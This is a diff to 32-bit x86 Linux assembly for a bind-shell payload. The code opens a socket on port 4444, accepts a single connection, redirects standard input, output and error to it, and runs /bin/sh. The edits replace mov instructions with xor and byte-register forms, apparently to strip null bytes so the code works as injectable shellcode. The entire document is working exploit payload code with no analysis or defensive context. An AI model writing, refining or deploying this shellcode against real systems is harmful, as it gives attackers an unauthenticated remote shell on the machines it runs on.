@@ -19,72 +19,74 @@ global _start
 
 _start:
 	; Obtain an AF_INET socket
-	mov eax, SYS_SOCKET	; syscall
-	mov ebx, AF_INET	; domain
-	mov ecx, SOCK_STREAM	; type
-	mov edx, 0		; protocol = 0
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	mov ax, SYS_SOCKET	; syscall
+	mov bl, AF_INET		; domain
+	mov cl, SOCK_STREAM	; type
+	xor edx, edx		; protocol = 0
 	int 0x80
 	mov edi, eax		; Save socket fd in EDI
 
 	; Push struct sockaddr_in backwards onto stack - all interfaces port 4444
-	xor eax, eax
-	push eax		; 4 bytes zero padding
-	push eax	    	; 4 bytes zero padding
-	push eax	    	; sin_addr = 0x00000000 = INADDR_ANY
+	push edx		; 4 bytes zero padding
+	push edx	    	; 4 bytes zero padding
+	push edx	    	; sin_addr = 0x00000000 = INADDR_ANY
 	push word LISTEN_PORT	; sin_port
 	push word AF_INET	; sin_family
 	
 	; Bind interface and port
-	mov eax, SYS_BIND	; syscall
+	mov ax, SYS_BIND	; syscall
 	mov ebx, edi		; sockfd = created socket fd
 	mov ecx, esp		; esp points to start of sockaddr
-	mov edx, 16   		; addrlen = sizeof(struct sockaddr) = 16
+	mov dl, 16   		; addrlen = sizeof(struct sockaddr) = 16
 	int 0x80
 
 	; Listen for connections
-	mov eax, SYS_LISTEN	; syscall
+	mov ax, SYS_LISTEN	; syscall
 	mov ebx, edi		; sockfd = created socket fd
-	mov ecx, 0		; backlog = 0
-	int 0x80
+	xor ecx, ecx		; backlog = 0
+	int 0x80 		; should place 0 in eax
 
 	; Accept the first connection that arrives
 	; This won't work more than once
-	mov eax, SYS_ACCEPT4   ; syscall
+	mov ax, SYS_ACCEPT4    ; syscall
 	mov ebx, edi	       ; sockfd = created socket fd
-	mov ecx, 0	       ; addr
-	mov edx, 0	       ; addrlen
-	mov esi, 0	       ; flags
+	xor ecx, ecx	       ; addr
+	xor edx, edx	       ; addrlen
+	xor esi, esi	       ; flags
 	int 0x80
 	mov edi, eax	       ; retval is fd for the client connection
 
 	; Redirect STDIN, STDOUT and STDERR to the client socket
-	mov eax, SYS_DUP2       ; syscall
+	; assume new client fd was <256 so we can just overwrite al
+	mov al, SYS_DUP2        ; syscall
 	mov ebx, edi		; socket
-	mov ecx, 0		; STDIN
+	xor ecx, ecx		; STDIN
 	int 0x80
 
-	mov eax, SYS_DUP2	; syscall
-	mov ecx, 1		; STDOUT
+	mov al, SYS_DUP2	; syscall
+	mov cl, 1		; STDOUT
 	int 0x80
 
-	mov eax, SYS_DUP2	; syscall
-	mov ecx, 2		; STDERR
+	mov al, SYS_DUP2	; syscall
+	mov cl, 2		; STDERR
 	int 0x80
 
 	; Execute /bin/sh, inheriting file descriptors from this process
 	; /bin//sh = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
-	xor eax,eax
-	push eax		; null termination
+	push edx		; null termination
 	push dword 0x68732f2f	; last half of string
 	push dword 0x6e69622f	; first half of string = filename
-	push eax		; null terminator of array = envp array
+	push edx		; null terminator of array = envp array
 	lea ebx, [esp + 4]	; Point to beginning of /bin//sh in ebx
 	push ebx      		; After this, esp = start of argv array
 
-	mov eax, SYS_EXECVE	; syscall
+	mov al, SYS_EXECVE	; syscall
 	; ebx = filename is already set
 	mov ecx, esp	    	; argv
-	lea edx, [ecx + 4]	; envp
+	lea edx, [ecx + 4]	; envp = &argv[1]
 	int 0x80
 	
 	
